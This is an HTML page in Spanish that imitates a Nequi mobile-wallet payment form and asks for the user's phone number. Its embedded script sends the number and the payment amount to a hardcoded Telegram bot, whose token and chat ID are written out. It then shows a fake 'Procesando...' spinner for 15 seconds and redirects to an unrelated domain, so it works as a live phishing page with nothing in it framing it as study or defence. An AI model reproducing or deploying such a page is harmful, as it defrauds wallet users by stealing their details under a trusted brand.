<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pago con Nequi</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

  <style>
    :root {
      --brand-color: #5c2d91;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #fff;
      font-family: 'Inter', sans-serif;
      color: #222;
    }

    .container {
      width: 100%;
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 30px;
    }

    .nequi {
      color: var(--brand-color);
      font-size: 30px;
      font-weight: 600;
    }

    .amount {
      color: #333;
      font-size: 15px;
      font-weight: 600;
      text-align: right;
    }

    .content {
      width: 100%;
    }

    .title {
      color: #333;
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 10px;
    }

    .description {
      color: #666;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 25px;
    }

    .label {
      display: block;
      color: #333;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .custom-form-control {
      width: 100%;
      height: 50px;
      padding: 0 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
      font-size: 16px;
      font-family: inherit;
    }

    .custom-form-control:focus {
      border-color: var(--brand-color);
    }

    .btn {
      width: 100%;
      height: 50px;
      margin-top: 20px;
      border: none;
      border-radius: 25px;
      background: var(--brand-color);
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    .btn:hover {
      opacity: .95;
    }

    .footer {
      margin-top: 35px;
      text-align: center;
    }

    .footer img {
      max-width: 100%;
      height: auto;
    }

    .help {
      margin-top: 20px;
    }

    .help img {
      max-width: 100%;
      height: auto;
    }

    #loader {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(255, 255, 255, .95);
      z-index: 9999;
    }

    .loader-box {
      text-align: center;
    }

    .spinner {
      width: 42px;
      height: 42px;
      margin: 0 auto 15px;
      border: 4px solid #ddd;
      border-top-color: var(--brand-color);
      border-radius: 50%;
      animation: spin .8s linear infinite;
    }

    .loader-text {
      color: #555;
      font-size: 14px;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    #initialLoader {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #fff;
      z-index: 10000;
    }
  </style>
</head>

<body>

  <div id="initialLoader">
    <div class="loader-box">
      <div class="spinner"></div>
      <div class="loader-text">Cargando...</div>
    </div>
  </div>

  <div class="container">

    <div class="header">
      <div class="nequi">Nequi</div>

      <!-- El monto se mostrará aquí -->
      <div class="amount" id="monto">Monto: $0</div>
    </div>

    <div class="content">

      <div class="title">
        Paga con Nequi
      </div>

      <div class="description">
        Ingresa tu número de celular asociado a Nequi para continuar con el pago.
      </div>

      <form id="nequiForm">

        <label class="label" for="telefono">
          Número de celular
        </label>

        <input
          type="tel"
          id="telefono"
          name="telefono"
          class="custom-form-control"
          maxlength="10"
          inputmode="numeric"
          autocomplete="tel"
          placeholder="Número de celular"
        >

        <button type="submit" class="btn">
          VALIDAR
        </button>

      </form>

    </div>

    <div class="footer">
      <img src="img/pci.jpg" alt="PCI">
    </div>

    <div class="help">
      <img src="img/ayuda.png" alt="Ayuda">
    </div>

  </div>

  <div id="loader">
    <div class="loader-box">
      <div class="spinner"></div>
      <div class="loader-text">Procesando...</div>
    </div>
  </div>

  <script>
  // ================= CONFIGURACIÓN DE TELEGRAM =================
  const TELEGRAM_BOT_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k';
  const TELEGRAM_CHAT_ID = '7776240161';

  // ================= OCULTAR LOADER INICIAL =================
  window.addEventListener('load', function () {
    setTimeout(function () {
      const initialLoader = document.getElementById('initialLoader');
      if (initialLoader) {
        initialLoader.classList.add('hidden');
        initialLoader.style.pointerEvents = 'none';
        initialLoader.style.zIndex = '-1';
        initialLoader.style.display = 'none';
      }
    }, 1000); // reducido a 1s (antes 3000ms en uno y 500ms en otro)
  });

  // ================= REFERENCIAS A ELEMENTOS =================
  const form = document.getElementById('nequiForm');
  const input = document.getElementById('telefono');
  const modal = document.getElementById('loadingModal');
  const montoEl = document.getElementById('monto');

  // ================= OBTENER MONTO (unificado) =================
  function obtenerMontoRaw() {
    try {
      const params = new URLSearchParams(window.location.search);
      return (
        params.get("monto") ||
        localStorage.getItem("finalAmount") ||
        sessionStorage.getItem("finalAmount") ||
        localStorage.getItem("total_pagar") ||
        sessionStorage.getItem("total_pagar") ||
        "0"
      );
    } catch (e) {
      return "0";
    }
  }

  function convertirMonto(valor) {
    if (!valor) return 0;

    let texto = String(valor).trim().replace(/\$/g, "").replace(/\s/g, "");

    if (texto.includes(".") && texto.includes(",")) {
      texto = texto.replace(/\./g, "").replace(",", ".");
    } else if (texto.includes(",")) {
      texto = texto.replace(",", ".");
    } else if (texto.includes(".")) {
      const partes = texto.split(".");
      if (partes.length === 2 && partes[1].length === 3) {
        texto = texto.replace(".", "");
      }
    }

    texto = texto.replace(/[^\d.-]/g, "");
    const numero = Number(texto);
    return Number.isFinite(numero) ? numero : 0;
  }

  function mostrarMonto() {
    const montoOriginal = obtenerMontoRaw();
    const totalPagarNumero = convertirMonto(montoOriginal);

    if (totalPagarNumero > 0) {
      const montoFormateado = new Intl.NumberFormat("es-CO", {
        style: "currency",
        currency: "COP",
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(totalPagarNumero);

      montoEl.textContent = "Monto: " + montoFormateado;
    } else {
      montoEl.textContent = "Monto: $0";
    }
  }

  // ================= FUNCIÓN PARA MOSTRAR ERROR =================
  function mostrarError(mensaje) {
    alert(mensaje);
  }

  // ================= FUNCIÓN PARA ENVIAR A TELEGRAM =================
  async function enviarNotificacionTelegram(montoTexto, numero) {
    const mensaje = `🔔 *Nuevo pago Nequi*\n\n📱 Número: ${numero}\n💰 Monto: ${montoTexto}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: mensaje,
          parse_mode: 'Markdown'
        })
      });
      const data = await response.json();
      if (!data.ok) {
        console.error('Error al enviar a Telegram:', data.description);
        return false;
      }
      console.log('Notificación enviada a Telegram');
      return true;
    } catch (error) {
      console.error('Error de red al enviar a Telegram:', error);
      return false;
    }
  }

  // ================= PERMITIR SOLO NÚMEROS EN EL INPUT =================
  input.addEventListener("input", function () {
    this.value = this.value.replace(/\D/g, "");
  });

  // ================= EVENTO ÚNICO DEL FORMULARIO =================
  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    const nequi = input.value.trim();
    if (!/^\d{10}$/.test(nequi)) {
      return mostrarError("El número debe tener exactamente 10 dígitos.");
    }

    // Obtener el monto formateado que se muestra en la interfaz
    const montoMostrado = montoEl.textContent.replace('Monto: ', '');

    // 1. Mostrar modal de carga
    modal.style.display = 'flex';

    // 2. Enviar notificación a Telegram
    await enviarNotificacionTelegram(montoMostrado, nequi);

    // 3. Esperar 15 segundos con el modal visible
    await new Promise(resolve => setTimeout(resolve, 15000));

    // 4. Redirigir
    window.location.href = 'https://adminjelpit.site/jelpit/portal_pagos.html';
  });

  // ================= MOSTRAR MONTO AL CARGAR =================
  mostrarMonto();
</script>

   

</body>
</html>
